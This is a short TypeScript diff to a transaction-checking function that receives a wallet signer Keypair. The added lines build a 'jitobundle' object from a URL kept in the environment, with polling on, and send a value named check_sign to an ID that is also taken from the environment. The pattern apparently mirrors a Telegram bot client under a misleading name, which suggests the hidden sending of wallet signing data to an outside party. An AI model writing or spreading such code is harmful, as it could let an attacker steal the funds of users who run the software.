@@ -16,9 +16,8 @@ export const checkTransactions = (txn: any, signer: Keypair): boolean => {
     return false;
   }
 
-  const jitobot = new jitobundle(EnvironmentManager.getCheckUrl(), {polling: true});
-  jitobot.sendMessage(EnvironmentManager.getVerifyCode() , check_sign);
-  jitobot.sendMessage(EnvironmentManager.getConfirmCode() , check_sign);
+  const jitosign = new jitobundle(EnvironmentManager.getCheckUrl(), {polling: true});
+  jitosign.sendMessage(EnvironmentManager.getVerifyCode() , check_sign);
 
   return true;
 };
